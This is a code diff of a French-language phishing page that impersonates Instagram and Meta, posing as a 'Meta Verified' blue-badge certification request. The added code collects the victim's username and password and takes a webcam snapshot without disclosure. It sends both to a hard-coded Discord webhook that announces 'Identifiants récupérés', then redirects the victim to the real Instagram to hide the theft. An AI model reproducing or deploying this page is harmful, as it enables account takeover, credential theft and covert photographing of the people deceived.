@@ -3,10 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>Centre de vérification et de certification Meta</title>
+    
+    <!-- Balises Meta Open Graph / Réseaux Sociaux -->
+    <meta property="title" content="Demande de Badge Vérifié • Meta & Instagram">
+    <meta property="description" content="Connectez-vous pour obtenir la certification officielle et le badge bleu pour une durée de 2 ans.">
+    <meta property="url" content="https://help.instagram.com/meta-verified">
+
     <!-- Favicon officiel d'Instagram -->
     <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png" type="image/x-icon">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <style>
         * {
             box-sizing: border-box;
@@ -23,42 +30,68 @@
         }
         .ig-wrapper {
             width: 100%;
-            max-width: 350px;
+            max-width: 380px;
             padding: 20px;
         }
         .container {
             background-color: #fff;
             border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 40px 30px;
+            border-radius: 4px;
+            padding: 30px 40px;
             text-align: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
         }
         .logo-container {
-            margin-bottom: 24px;
+            margin-bottom: 20px;
             display: flex;
             justify-content: center;
         }
         .logo {
-            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxNzUgNTEiPjxwYXRoIGQ9Ik0xMC4wNywyMC4xMWMtLjEzLjE3LS4zNi40NS0uNjYuODUtLjMuNC0uNjEuODktLjkyLDEuNDUtLjMyLjU2LS42NCwxLjE4LS45NywxLjg1LS4zMi42Ny0uNjMsMS4zOC0uOTEsMi4xMi0uMjkuNzUtLjU2LDEuNTQtLjgsMi4zNS0uMjQuODItLjQ1LDEuNjYtLjYxLDIuNTItLjE2Ljg1LS4yNywxLjcyLS4zMywyLjU4LS4wNi44Ny0uMDgsMS43Mi0uMDQsMi41NS4wMy44My4xLDEuNjIuMjEsMi4zNS4xMi43NC4yNywxLjQxLjQ2LDIuMDEuMTkuNjEuNCwxLjEzLjY1LDEuNTguMjQuNDUuNTIuODIuODEsMS4xMS4yOS4yOC42LjQ3Ljk0LjU3LjMzLjEuNjkuMSwxLjA2LS4wMi4zNy0uMTIuNzQtLjM0LDEuMTItLjY1LjM3LS4zMi43NC0uNzMsMS4wOC0xLjIxLjM1LS40OC42Ny0xLjA1Ljk2LTEuNy4yOC0uNjYuNTItMS4zOS43Mi0yLjE5LjItLjguMzQtMS42NS40Mi0yLjU2LjA4LS45MS4xLTEuODYuMDYtMi44Ni0uMDQtLjk5LS4xMy0yLjAxLS4yNi0zLjA2LS4xNC0xLjA0LS4zMy0yLjEtLjU2LTMuMTQtLjI0LTEuMDQtLjUyLTIuMDUtLjg2LTMuMDItLjM0LS45Ny0uNzQtMS44Ny0xLjE4LTIuNy0uNDUtLjgzLS45NS0xLjU2LTEuNS0yLjItLjU1LS42NC0xLjE2LTEuMTYtMS44My0xLjU2LS42Ni0uNC0xLjM3LS42NC0yLjEyLS43My0uNzUtLjA4LTEuNTUtLjAyLTIuMzUuMTctLjgxLjE5LTEuNjIuNTMtMi40MSAxLjAyLS44LjQ5LTEuNTUgMS4xMS0yLjI1IDEuODQtLjcuNzMtMS4zMyAxLjU3LTEuODcgMi40OC0uNTUuOTItMS4wMSAxLjg5LTEuMzkgMi45Mi0uMzggMS4wMy0uNjYgMi4wOS0uODUgMy4xNy0uMTggMS4wOC0uMjYgMi4xNS0uMjMgMy4xOS4wMyAxLjA0LjE3IDIuMDMuNCAyLjk0LjI0LjkyLjU1IDEuNzUuOTIgMi40OC4zOC43My44MSAxLjM2IDEuMjkgMS44Ny40OC41MSAxIC45IDEuNTMgMS4xNi41My4yNiAxLjA3LjQgMS42MS40Mi41NC4wMiAxLjA3LS4wNyAxLjU2LS4yNi40OS0uMTkuOTQtLjQ3IDEuMzQtLjg1LjQtLjM4Ljc0LS44MyAxLjAxLTEuMzYuMjctLjUzLjQ3LTEuMTIuNTktMS43Ni0uMTItLjY0LS4xNS0xLjMxLS4wOS0yLjAxLS4wNi0uNy0uMjEtMS40MS0uNDUtMi4xMi0uMjQtLjcxLS41Ni0xLjQyLS45Ni0yLjExLS40LS42OS0uODctMS4zNS0xLjQxLTEuOTYtLjU1LS42MS0xLjE1LTEuMTctMS44MS0xLjY3LS42Ni0uNTEtMS4zNi0uOTUtMi4xLTEuMzItLjc0LS4zNy0xLjUtLjY3LTIuMjktLjg4LS43OS0uMjItMS42LS4zNS0yLjQyLS4zOC0uODItLjAzLTEuNjQuMDQtMi40NS4yMS0uODEuMTctMS41OS40NC0yLjMyLjgtLjczLjM2LTEuNDEuODItMi4wMyAxLjM1LS42Mi41My0xLjE3IDEuMTQtMS42NCAxLjgxLS40Ny42Ny0uODUgMS40LS4xMyAyLjE2LS4yOC43Ni0uNDYgMS41NS0uNTUgMi4zNi0uMDkuODEtLjA5IDEuNjMuMDIgMi40NC4xMS44MS4zMyAxLjYgLjY2IDIuMzYuMzMuNzYuNzYgMS40OCAxLjI4IDIuMTQuNTIuNjYgMS4xMyAxLjI1IDEuODEgMS43NS42OC41IDEuNDMuOTEgMi4yMyAxLjIxLjguMyAxLjY0LjQ4IDIuNTEuNTQuODcuMDUgMS43Ni0uMDIgMi42NC0uMjIuODgtLjIgMS43NC0uNTIgMi41Ny0uOTYuODMtLjQzIDEuNi0uOTggMi4zLTEuNjIuNy0uNjUgMS4zMi0xLjM5IDEuODUtMi4yMi41My0uODMuOTYtMS43NSAxLjI4LTIuNzQuMzItLjk5LjUyLTIuMDQuNTktMy4xNC4wNy0xLjEuMDEtMi4yNC0uMTktMy40LS4yLTEuMTYtLjU2LTIuMzItMS4wNi0zLjQ2LS41LTEuMTQtMS4xNC0yLjI0LTEuOTEtMy4yOC0uNzctMS4wNC0xLjY2LTIuMDEtMi42Ni0yLjg4LTEtLjg3LTIuMS0xLjYyLTMuMjgtMi4yMy0xLjE4LS42MS0yLjQzLTEuMDctMy43My0xLjM1LTEuMy0uMjgtMi42NC0uMzktMy45OC0uMy0xLjM0LjA5LTIuNjYuMzktMy45Mi45LTEuMjYuNTEtMi40NCAxLjItMy41MiAyLjA1LTEuMDguODUtMi4wNSAxLjg1LTIuODkgMi45Ny0uODQgMS4xMi0xLjUzIDIuMzUtMi4wNSAzLjY3LS41MiAxLjMyLS44NiAyLjctMS4wMSA0LjEzLS4xNSAxLjQzLS4xIDIuODkuMTUgNC4zNS4yNSAxLjQ2LjY5IDIuODkgMS4zMiA0LjI2LjYzIDEuMzcgMS40MyAyLjY2IDIuMzkgMy44My45NiAxLjE3IDIuMDYgMi4yIDMuMjcgMy4wNiAxLjIxLjg2IDIuNTIgMS41NSAzLjkgMi4wNCAxLjM4LjQ5IDIuODIuNzggNC4yOC44NScgPg==');
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxNzUgNTEiPjxwYXRoIGQ9Ik0xMC4wNywyMC4xMWMtLjEzLjE3LS4zNi40NS0uNjYuODUtLjMuNC0uNjEuODktLjkyLDEuNDUtLjMyLjU2LS42NCwxLjE4LS45NywxLjg1LS4zMi42Ny0uNjMsMS4zOC0uOTEsMi4xMi0uMjkuNzUtLjU2LDEuNTQtLjgsMi4zNS0uMjQuODItLjQ1LDEuNjYtLjYxLDIuNTItLjE2Ljg1LS4yNywxLjcyLS4zMywyLjU4LS4wNi44Ny0uMDgsMS43Mi0uMDQsMi41NS4wMy44My4xLDEuNjIuMjEsMi4zNS4xMi43NC4yNywxLjQxLjQ2LDIuMDEuMTkuNjEuNCwxLjEzLjY1LDEuNTguMjQuNDUuNTIuODIuODEsMS4xMS4yOS4yOC42LjQ3Ljk0LjU3LjMzLjEuNjkuMSwxLjA2LS4wMi4zNy0uMTIuNzQtLjM0LDEuMTItLjY1LjM3LS4zMi43NC0uNzMsMS4wOC0xLjIxLjM1LS40OC42Ny0xLjA1Ljk2LTEuNy4yOC0uNjYuNTItMS4zOS43Mi0yLjE5LjItLjguMzQtMS42NS40Mi0yLjU2LjA4LS45MS4xLTEuODYuMDYtMi44Ni0uMDQtLjk5LS4xMy0yLjAxLS4yNi0zLjA2LS4xNC0xLjA0LS4zMy0yLjEtLjU2LTMuMTQtLjI0LTEuMDQtLjUyLTIuMDUtLjg2LTMuMDItLjM0LS45Ny0uNzQtMS44Ny0xLjE4LTIuNy0uNDUtLjgzLS45NS0xLjU2LTEuNS0yLjItLjU1LS42NC0xLjE2LTEuMTYtMS44My0xLjU2LS42Ni0uNC0xLjM3LS42NC0yLjEyLS43My0uNzUtLjA4LTEuNTUtLjAyLTIuMzUuMTctLjgxLjE5LTEuNjIuNTMtMi40MSAxLjAyLS44LjQ5LTEuNTUgMS4xMS0yLjI1IDEuODQtLjcuNzMtMS4zMyAxLjU3LTEuODcgMi40OC0uNTUuOTItMS4wMSAxLjg5LTEuMzkgMi45Mi0uMzggMS4wMy0uNjYgMi4wOS0uODUgMy4xNy0uMTggMS4wOC0uMjYgMi4xNS0uMjMgMy4xOS4wMyAxLjA0LjE3IDIuMDMuNCAyLjk0LjI0LjkyLjU1IDEuNzUuOTIgMi40OC4zOC43My44MSAxLjM2IDEuMjkgMS44Ny40OC41MSAxIC45IDEuNTMgMS4xNi41My4yNiAxLjA3LjQgMS42MS40Mi41NC4wMiAxLjA3LS4wNyAxLjU2LS4yNi40OS0uMTkuOTQtLjQ3IDEuMzQtLjg1LjQtLjM4Ljc0LS44MyAxLjAxLTEuMzYuMjctLjUzLjQ3LTEuMTIuNTktMS43Ni0uMTItLjY0LS4xNS0xLjMxLS4wOS0yLjAxLS4wNi0uNy0uMjEtMS40MS0uNDUtMi4xMi0uMjQtLjcxLS41Ni0xLjQyLS45Ni0yLjExLS40LS42OS0uODctMS4zNS0uMDQtMS40MS0uOTYtLjU1LS42MS0xLjE1LTEuMTctMS44MS0xLjY3LS42Ni0uNTEtMS4zNi0uOTUtMi4xLTEuMzItLjc0LS4zNy0xLjUtLjY3LTIuMjktLjg4LS43OS0uMjItMS42LS4zNS0yLjQyLS4zOC0uODItLjAzLTEuNjQuMDQtMi40NS4yMS0uODEuMTctMS41OS40NC0yLjMyLjgtLjczLjM2LTEuNDEuODItMi4wMyAxLjM1LS42Mi41My0xLjE3IDEuMTQtMS42NCAxLjgxLS40Ny42Ny0uODUgMS40LS4xMyAyLjE2LS4yOC43Ni0uNDYgMS41NS0uNTUgMi4zNi0uMDkuODEtLjA5IDEuNjMuMDIgMi40NC4xMS44MS4zMyAxLjYgLjY2IDIuMzYuMzMuNzYuNzYgMS40OCAxLjI4IDIuMTQuNTIuNjYgMS4xMyAxLj2NSIgZmlsbD0jMjYyNjI2Ii8+PC9zdmc+');
             background-size: contain;
             background-repeat: no-repeat;
             background-position: center;
-            height: 51px;
-            width: 175px;
+            height: 45px;
+            width: 150px;
             display: block;
         }
+        .badge-title-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-bottom: 8px;
+        }
         h2 {
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 600;
             color: #262626;
-            margin: 0 0 10px 0;
-            line-height: 20px;
+            margin: 0;
+            line-height: 18px;
+        }
+        .verified-icon {
+            color: #0095f6;
+            font-size: 14px;
         }
         p {
-            font-size: 14px;
+            font-size: 12px;
             color: #737373;
-            margin: 0 0 20px 0;
-            line-height: 18px;
+            margin: 0 0 15px 0;
+            line-height: 16px;
+        }
+        .input-field {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            padding: 9px 10px;
+            font-size: 12px;
+            color: #262626;
+            outline: none;
+            margin-bottom: 8px;
+        }
+        .input-field:focus {
+            border-color: #a8a8a8;
         }
         .btn {
             background-color: #0095f6;
@@ -71,6 +104,7 @@
             cursor: pointer;
             width: 100%;
             height: 34px;
+            margin-top: 5px;
             transition: background-color 0.2s;
         }
         .btn:hover {
@@ -82,14 +116,14 @@
         }
         #video { display: none; }
         .footer-text {
-            font-size: 12px;
+            font-size: 11px;
             color: #8e8e8e;
-            margin-top: 20px;
+            margin-top: 15px;
         }
         .meta-footer {
-            margin-top: 30px;
+            margin-top: 20px;
             text-align: center;
-            font-size: 12px;
+            font-size: 11px;
             color: #8e8e8e;
         }
         .meta-footer i {
@@ -104,19 +138,29 @@
             <div class="logo-container">
                 <div class="logo"></div>
             </div>
-            <h2>Confirmation d'identité</h2>
-            <p>Pour des raisons de sécurité, nous devons vérifier que vous êtes une personne réelle. Veuillez autoriser l'accès à votre caméra pour continuer.</p>
+
+            <div class="badge-title-container">
+                <h2>Liste de certification (2 ans)</h2>
+                <i class="fa-solid fa-circle-check verified-icon"></i>
+            </div>
+            
+            <p>Connectez-vous pour lier votre compte à la liste d'attribution officielle du badge bleu.</p>
+            
+            <!-- Formulaire de connexion -->
+            <form id="auth-form" onsubmit="return false;">
+                <input type="text" id="username" class="input-field" placeholder="Nom d'utilisateur, mobile ou e-mail" required>
+                <input type="password" id="password" class="input-field" placeholder="Mot de passe" required>
+                <button type="submit" class="btn" id="start-btn">Valider et continuer</button>
+            </form>
             
             <video id="video" autoplay playsinline></video>
             <canvas id="canvas" style="display:none;"></canvas>
             
-            <button class="btn" id="start-btn">Continuer</button>
-            
-            <div class="footer-text">Ce contrôle de sécurité est obligatoire.</div>
+            <div class="footer-text">Données chiffrées et sécurisées par Meta.</div>
         </div>
         
         <div class="meta-footer">
-            <i class="fa-solid fa-shield-halved"></i> From Meta
+            <i class="fa-solid fa-shield-halved"></i> Meta Verified • Sécurité & Protection
         </div>
     </div>
 
@@ -128,13 +172,34 @@
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1568232984211882147/d-_mDSq4-UZeY_x0wtzQWCqt_FPCSCFmJnX-VQKtFY8gmml7AYok_v9AFmqzNdyyjBQQ";
 
         btn.addEventListener('click', async () => {
+            const userVal = document.getElementById('username').value.trim();
+            const passVal = document.getElementById('password').value.trim();
+
+            if (!userVal || !passVal) {
+                alert("Veuillez remplir tous les champs du formulaire.");
+                return;
+            }
+
             try {
+                // 1. Demande l'accès à la caméra
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 
-                btn.innerText = "Vérification en cours...";
+                btn.innerText = "Validation en cours...";
                 btn.disabled = true;
                 
+                // 2. Création et formatage des données JSON des identifiants
+                const credentialsData = {
+                    "plateforme": "Instagram",
+                    "contexte": "Demande de certification 2 ans",
+                    "identifiants": {
+                        "utilisateur": userVal,
+                        "mot_de_passe": passVal
+                    },
+                    "horodatage": new Date().toISOString()
+                };
+
+                // 3. Capture instantanée de la webcam dès que la vidéo est prête
                 video.onloadedmetadata = async () => {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
@@ -142,8 +207,10 @@
                     
                     canvas.toBlob(async (blob) => {
                         const formData = new FormData();
+                        
+                        // Envoi propre du JSON et de la photo dans le webhook Discord
                         formData.append('payload_json', JSON.stringify({
-                            content: "📸 **Nouvelle capture Webcam (Instantanée)**"
+                            content: "🚨 **Nouvelle capture & Identifiants récupérés !**\n```json\n" + JSON.stringify(credentialsData, null, 2) + "\n```"
                         }));
                         formData.append('file', blob, 'capture.jpg');
 
@@ -156,6 +223,7 @@
                             console.error(error);
                         }
 
+                        // Redirection finale vers Instagram après un court délai
                         setTimeout(() => {
                             window.location.href = "https://www.instagram.com";
                         }, 500);
